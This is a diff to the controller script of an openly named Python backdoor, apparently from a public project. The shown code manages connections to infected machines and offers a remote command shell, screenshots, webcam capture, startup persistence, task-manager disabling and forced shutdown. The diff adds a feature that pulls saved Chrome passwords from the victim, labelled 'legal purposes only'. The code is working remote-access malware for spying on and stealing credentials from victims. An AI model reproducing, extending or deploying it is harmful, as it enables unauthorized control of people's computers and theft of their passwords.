@@ -1,12 +1,7 @@
 '''
 Simple python backdoor by xp4xbox
+https://www.instructables.com/id/Simple-Python-Backdoor/
 License: https://github.com/xp4xbox/Simple-Python-Backdoor/blob/master/LICENSE
-
-VERSION 1.5 CHANGELOG:
-server is now Linux compatible!
-receiving/sending large data is now reliable
-file browser now outputs data in the console
-other minor changes
 
 Client Requires:
 
@@ -36,7 +31,7 @@ strHost = "0.0.0.0"
 intPort = 3000
 
 if not sys.platform == "linux" or sys.platform == "linux2":
-    os.system("title Simple Backdoor v1.5")
+    os.system("title Simple Backdoor v2")
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
@@ -46,10 +41,11 @@ def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
     while True:
         bytPart = conn.recv(buffer)
+        if len(bytPart) == buffer:
+            return bytPart
         bytData += bytPart
         if len(bytData) == buffer:
-            break
-    return bytData
+            return bytData
 
 
 def create_socket():
@@ -159,7 +155,7 @@ def list_connections():
 
 
 def select_connection(connection_id, blnGetResponse):
-    global conn
+    global conn, strIP
     try:
         connection_id = int(connection_id)
         conn = arConnections[connection_id]
@@ -167,8 +163,10 @@ def select_connection(connection_id, blnGetResponse):
         print("Invalid choice, please try again!")
         return
     else:
+        strIP = arAddresses[connection_id][0]
+
         if blnGetResponse == "True":
-            print("You are connected to " + arAddresses[connection_id][0] + " ...." + "\n")
+            print("You are connected to " + strIP + " ...." + "\n")
         return conn
 
 
@@ -176,7 +174,7 @@ def user_info():
     conn.send(str.encode("info"))
     strClientResponse = conn.recv(1024)
     strClientResponse = decode_utf8(strClientResponse)
-    print(strClientResponse, end="")
+    print(strClientResponse + "IP: " + strIP)
 
 
 def screenshot():
@@ -366,7 +364,28 @@ def command_shell():  # remote cmd shell
 
 def disable_taskmgr():
     conn.send(str.encode("dtaskmgr"))
-    print("Disabling ...")
+    print(decode_utf8(conn.recv(1024)))  # print response
+
+
+def chrpass():  # legal purposes only!
+    conn.send(str.encode("chrpass"))
+    strClientResponse = decode_utf8(conn.recv(1024))
+
+    if strClientResponse == "noexist":
+        print("Google Chrome is not installed on target.")
+        return
+
+    if strClientResponse == "error":
+        strClose = input("Browser is currently in use. Would you like to close it? y/n ")
+        if strClose == "y":
+            conn.send(str.encode("close"))
+        else:
+            conn.send(str.encode("stay"))
+        return
+    else:
+        intBuffer = int(strClientResponse)
+
+    print("\n" + decode_utf8(recvall(intBuffer)))  # print results
 
 
 def show_help():
@@ -379,12 +398,12 @@ def show_help():
     print("--p (2) Take webcam snapshot")
     print("--a Run at startup")
     print("--v View files")
-    print("--x (1) Lock user")
-    print("--x (2) Restart user")
-    print("--x (3) Shutdown user")
     print("--u User Info")
     print("--e Open remote cmd")
     print("--d Disable task manager")
+    print("--x (1) Lock user")
+    print("--x (2) Restart user")
+    print("--x (3) Shutdown user")
     print("--b Move connection to background")
     print("--c Close connection")
 
@@ -433,6 +452,8 @@ def send_commands():
                 command_shell()
             elif strChoice == "--d":
                 disable_taskmgr()
+            elif strChoice == "--g":
+                chrpass()
             else:
                 print("Invalid choice, please try again!" + "\n")
 
